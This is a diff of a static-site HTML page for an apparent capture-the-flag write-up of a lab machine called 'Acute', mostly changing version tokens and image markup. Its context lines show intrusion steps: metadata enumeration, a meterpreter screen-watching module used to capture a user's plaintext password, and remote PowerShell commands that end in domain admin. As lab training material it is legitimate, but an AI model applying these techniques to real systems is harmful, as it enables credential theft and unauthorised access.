@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.711332202751">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.711332450660">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 2.4.0">
@@ -32,12 +32,12 @@
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../../../resources/css/retype.css?v=2.4.0.711332202751" rel="stylesheet" />
+    <link href="../../../../resources/css/retype.css?v=2.4.0.711332450660" rel="stylesheet" />
 
-    <script type="text/javascript" src="../../../../resources/js/config.js?v=2.4.0.711332202751" data-turbo-eval="false" defer></script>
+    <script type="text/javascript" src="../../../../resources/js/config.js?v=2.4.0.711332450660" data-turbo-eval="false" defer></script>
     <script type="text/javascript" src="../../../../resources/js/retype.js?v=2.4.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" type="text/javascript" src="../../../../resources/js/lunr.js?v=2.4.0.711332202751" data-turbo-eval="false" defer></script>
-    <script id="prism-js" type="text/javascript" src="../../../../resources/js/prism.js?v=2.4.0.711332202751" defer></script>
+    <script id="lunr-js" type="text/javascript" src="../../../../resources/js/lunr.js?v=2.4.0.711332450660" data-turbo-eval="false" defer></script>
+    <script id="prism-js" type="text/javascript" src="../../../../resources/js/prism.js?v=2.4.0.711332450660" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -265,9 +265,17 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre>
     </h2>
 </doc-anchor-target>
 <p>Browsing to <a href="https://10.10.11.145/">https://10.10.11.145/</a> we are given a 404 not found page. However, browsing to <a href="https://atsserver.acute.local/">https://atsserver.acute.local/</a> we are directed to &quot;Acute Health&quot; page:
-![[acute/images/image1.png]]</p>
+<figure class="content-center">
+    <img src="images/image1.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>If we go to <a href="https://atsserver.acute.local/about.html">https://atsserver.acute.local/about.html</a> it is possible to download a <code v-pre>.docx</code> file clicking in the &quot;New Starter Forms&quot; on the top right corner:
-![[acute/images/image2.png]]</p>
+<figure class="content-center">
+    <img src="images/image2.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>I will use <code v-pre>libreoffice</code> to open the file and read its contents:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">$ libreoffice New_Starter_CheckList_v7.docx
@@ -306,7 +314,11 @@ Arrange for the new starter to meet with other staff in the department as approp
     </h3>
 </doc-anchor-target>
 <p>Accessing <a href="https://atsserver.acute.local/Acute_Staff_Access">https://atsserver.acute.local/Acute_Staff_Access</a>:
-![[acute/images/image3.png]]</p>
+<figure class="content-center">
+    <img src="images/image3.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>So we need username, password and computer name. So far we have default password. But we don’t have computer name.</p>
 <p>Running <code v-pre>exiftool</code> in the <code v-pre>.docx</code> file we get a bit more information:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -364,7 +376,11 @@ App Version                     : 16.0000</code></pre>
 So we have 2 usernames and the computer name.</li>
 </ul>
 <p>If we come back to the About page, there is a list of employees:
-![[acute/images/image4.png]]</p>
+<figure class="content-center">
+    <img src="images/image4.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>If we try to follow the same username format that is in the <code v-pre>exiftool</code> &quot;Creator&quot; field we get:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-none"><code v-pre class="language-none">awallace
@@ -518,7 +534,11 @@ Try the new cross-platform PowerShell https://aka.ms/pscore6
 PS C:\Utils&gt;</code></pre>
 </doc-codeblock></div>
 <p>I ran WinPEAS and got this interesting info:
-![[acute/images/image5.png]]</p>
+<figure class="content-center">
+    <img src="images/image5.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>This means that <code v-pre>edavies</code> is using RDP (gui interface) and is ACTIVE!
 We can use a meterpreter module to watch his screen:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -528,7 +548,11 @@ We can use a meterpreter module to watch his screen:</p>
 [*] Streaming...</code></pre>
 </doc-codeblock></div>
 <p>While stalking <code v-pre>edavies</code> we see the user opening a PowerShell session and entering some commands:
-![[acute/images/image6.png]]</p>
+<figure class="content-center">
+    <img src="images/image6.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>This was his commands:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-powershell"><code v-pre class="language-powershell">$pass = ConvertTo-SecureString &quot;W3_4R3_th3_f0rce.&quot; -AsPlaintext -Force  
@@ -751,7 +775,11 @@ Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential 
 acute\awallace</code></pre>
 </doc-codeblock></div>
 <p>Enumerating files and directories there is one that sticks out - <code v-pre>keepmeon</code>:
-![[acute/images/image7.png]]</p>
+<figure class="content-center">
+    <img src="images/image7.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>Lets read its content:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-powershell"><code v-pre class="language-powershell">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {cat 'c:\program files\keepmeon\keepmeon.bat'}
@@ -785,7 +813,10 @@ Mode                 LastWriteTime         Length Name                       PSC
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Utils&gt; Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {whoami /groups}</code></pre>
 </doc-codeblock></div>
-<p>![[acute/images/image8.png]]
+<p><figure class="content-center">
+    <img src="images/image8.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
 Yes! We got it.
 We are domain admin now. Let’s read the final flag from administrators directory.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
